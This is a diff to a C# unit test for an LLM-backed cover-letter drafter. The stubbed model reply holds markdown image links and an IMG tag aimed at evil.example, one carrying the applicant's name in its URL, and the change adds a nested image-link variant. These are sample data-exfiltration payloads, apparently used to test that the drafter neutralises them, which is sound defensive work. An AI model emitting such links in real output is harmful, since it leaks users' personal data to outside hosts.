@@ -85,7 +85,7 @@ public class CoverLetterDrafterTests
         var letter = new string('y', 60);
         var stub = new StubLlmClient((_, _, _) =>
             letter + "\n\n![](https://evil.example/p?d=Ada%20Byte) ![logo][r] <IMG src=\"https://evil.example/x\">"
-            + " ![Acme logo](https://evil.example/l.png \"t\")");
+            + " ![Acme logo](https://evil.example/l.png \"t\") ![a ![b](https://evil.example/1)](https://evil.example/2)");
 
         var body = await new CoverLetterDrafter(stub)
             .DraftAsync(new AppFields { Company = "Acme" }, SampleResume(), Cfg);
